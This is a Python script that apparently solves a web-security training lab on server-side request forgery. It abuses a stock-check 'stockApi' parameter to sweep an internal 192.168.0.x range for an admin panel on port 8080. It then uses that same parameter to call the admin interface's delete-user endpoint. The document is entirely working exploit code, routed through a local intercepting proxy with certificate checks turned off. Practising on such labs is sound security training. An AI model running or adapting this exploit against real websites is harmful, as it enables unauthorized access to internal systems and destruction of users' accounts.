import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scan_admin(url):
    for i in range(1, 256):
        ip = f'192.168.0.{i}'
        admin_url = f'http://{ip}:8080/admin'
        param = {'stockApi': admin_url}
        check_stock_path = '/product/stock'

        try:
            r = requests.post(url+check_stock_path, data=param, verify=False, proxies=proxies, timeout=2, allow_redirects=False)
            if r.status_code == 200:
                print(f"(+) Admin ip is {ip}.")
                return ip 
        except:
            pass

    print("(-) No admin interface found")
    return None

def delete_user(url, ip):
    payload = f'http://{ip}:8080/admin/delete?username=carlos'
    param2 = {'stockApi': payload}
    check_stock_path = '/product/stock'
    r = requests.post(url+check_stock_path, data=param2, verify=False, proxies=proxies)
    r2 = requests.get(url, verify=False, proxies=proxies)

    if r.status_code == 302 or 'is-solved' in r2.text:
        print("(+) Successfully deleted Carlos user!")

    else:
        print("(-) Exploit was unsuccessful.")


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    ip = scan_admin(url)
    if ip != None:
        delete_user(url, ip)
    else:
        sys.exit(-1)


if __name__ == "__main__":
    main()